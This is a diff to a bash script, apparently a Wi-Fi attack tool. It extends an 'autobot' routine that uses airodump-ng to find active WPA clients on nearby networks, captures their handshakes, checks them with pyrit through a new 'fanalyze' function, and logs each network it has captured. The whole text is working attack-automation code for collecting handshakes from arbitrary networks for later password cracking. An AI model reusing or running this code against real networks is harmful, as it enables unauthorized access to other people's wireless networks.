@@ -21,16 +21,33 @@ fautobot()																#Automagically find active clients and collect new han
 	$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
 	echo
 	$COLOR 4;echo " [*] Scanning for active clients.. ";$COLOR 9
+	LNUM=0
 	while [ $DONE -z ] 2> /dev/null
 		do
-			sleep 5
-			BSSID=$(cat $HOME/tmp-01.csv | grep 'Station' -A 10 | grep ':' | cut -d ',' -f 6 | head -n 1)
-			BSSID=${BSSID:1}
+			sleep 0.5
+			echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 6)" > $HOME/tmp3
+			cat $HOME/tmp3 | tr -d '(not associated)' | sed '/^$/d' | sort -uR > $HOME/tmp2
+					while read LINE
+						do
+							case $LNUM in
+								1)BSSIDL=$LINE;;
+								2)BSSIDL=$LINE;;
+								3)BSSIDL=$LINE;;
+								4)BSSIDL=$LINE;;
+								5)BSSIDL=$LINE
+							esac
+							if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSIDL) -z ] 2> /dev/null
+								then
+									BSSID=$LINE
+							fi
+						done <$HOME/tmp2
+						
+			LNUM=$((LNUM + 1))
 			ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 14 | head -n 1)
 			ESSID=${ESSID:1}
 			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 4 | head -n 1)
 			CHAN=$((CHAN + 1 - 1))
-			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 10 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
+			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
 			if [ ${BSSID:2:1} = ":" ] 2> /dev/null
 				then
 					if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSID) -z ] 2> /dev/null
@@ -44,6 +61,15 @@ fautobot()																#Automagically find active clients and collect new han
 							DONE=""
 					fi
 			fi
+			if [ $CLIE -z ] 2>/dev/null
+				then
+					DONE=""
+			fi
+			echo
+			echo $ESSID
+			echo $BSSID
+			echo $CHAN
+			echo $CLIE
 		done
 	killall airodump-ng
 	rm -rf $HOME/tmp*
@@ -62,7 +88,9 @@ fautobot()																#Automagically find active clients and collect new han
 			sleep 3
 			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
 			sleep 3
-			DONE=$(pyrit -r $HOME/tmp1-01.cap analyze | grep good)
+			DONE=""
+			DONE2=""
+			fanalyze
 			sleep 0.5
 			DECNT=$((DECNT + 1))
 			if [ $DECNT -gt 5 ] 2> /dev/null
@@ -70,7 +98,16 @@ fautobot()																#Automagically find active clients and collect new han
 					killall airodump-ng
 					fautobot
 			fi
-		done
+			if [ $GDONE = "1" ] 2> /dev/null
+				then
+					DONE=1
+				else
+					$COLOR 1; echo " [*] No handshake detected ";$COLOR 9
+					DONE=""
+			fi
+			done
+	GDONE=""
+	DONE=""
 	killall airodump-ng
 	clear
 	echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
@@ -86,6 +123,46 @@ fautobot()																#Automagically find active clients and collect new han
 	sleep 3
 	fautobot
 }		
+
+fanalyze()
+{
+while [ $DONE2 -z ] 2> /dev/null
+	do
+		ISDONE=$(pyrit -r $HOME/tmp1-01.cap analyze)
+		if [ $ISDONE -z ] 2> /dev/null
+			then
+				fanalyze
+		fi
+		echo "$ISDONE" > $HOME/tmp4
+		if [ $( cat $HOME/tmp4 | grep "Traceback") -z ] 2> /dev/null
+			then
+				A=1
+			else
+				fanalyze
+		fi
+		if [ $( cat $HOME/tmp4 | grep "bad") -z ] 2> /dev/null
+			then
+				DONE2=1
+		fi
+		
+		if [ $( cat $HOME/tmp4 | grep "workable") -z ] 2> /dev/null
+			then
+				A=1
+			else
+				DONE2=1
+				GDONE=1
+		fi
+		if [ $( cat $HOME/tmp4 | grep "good") -z ] 2> /dev/null
+			then
+				A=1
+			else
+				DONE2=1
+				GDONE=1
+		fi
+	done
+	
+	
+}
 
 fapscan()																#Determine target AP BSSID and channel
 {
@@ -186,9 +263,9 @@ fclientscan()															#Find active clients
 	while [ $DONE -z ] 2> /dev/null
 		do
 			sleep 0.3
-			DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 | grep $BSSID)
+			DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 20 | grep $BSSID)
 		done
-	DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 | grep $BSSID)
+	DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 20 | grep $BSSID)
 	echo "$DONE" > $HOME/tmp
 	while read LINE
 		do
